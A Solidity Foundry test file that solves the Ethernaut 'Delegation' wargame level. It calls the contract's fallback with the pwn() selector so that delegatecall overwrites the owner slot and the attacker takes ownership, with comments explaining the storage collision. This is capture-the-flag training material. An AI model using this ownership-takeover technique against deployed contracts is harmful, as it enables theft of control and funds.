// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "forge-std/Test.sol";
import "forge-std/Vm.sol";

import "../src/Ethernaut.sol";
import "ethernaut/contracts/levels/DelegationFactory.sol";

contract DelegationExploit is DSTest {
	Vm private vm = Vm(address(HEVM_ADDRESS));
	Ethernaut private ethernaut;
	address private eoaAddress = address(1337);

	function setUp() public {
		ethernaut = new Ethernaut();
		vm.deal(eoaAddress, 1 ether);
	}

	function testExploit() public {
		// Setting up the level
		DelegationFactory factory = new DelegationFactory();
		ethernaut.registerLevel(factory);
		vm.startPrank(eoaAddress);
		address levelAddress = ethernaut.createLevelInstance(factory);
		Delegation target = Delegation(payable(levelAddress));

		// TODO: Exploit the contract
		// Delegatecall is a special function that can be used to invoke functions from another contract
		// while also preserving the current, calling's contract context (its storage, msg.sender and
		// msg.value attributes).
		// Here, we notice that:
		// - the Delegation contract uses delegatecall to invoke one of Delegate contract's function
		// - both contracts store the owner address in the first slot of their storage
		// - the Delegate contract has a pwn function that enables us to update the owner address value
		// Thus, we can update the owner value of the Delgation contract by calling the pwn function of
		// the Delgate contract

		// Compute the hash of the pwn method
		bytes4 pwnHash = bytes4(keccak256("pwn()"));

		// Call the fallback method of the Delegation contract
		// This will call the pwn method of the Delegate contract using delegatecall and make the caller
		// the new owner of the Delegation contract
		address(target).call(abi.encode(pwnHash));

		// Submit the solution
		bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(payable(levelAddress));
		vm.stopPrank();
		assert(levelSuccessfullyPassed);
	}
}
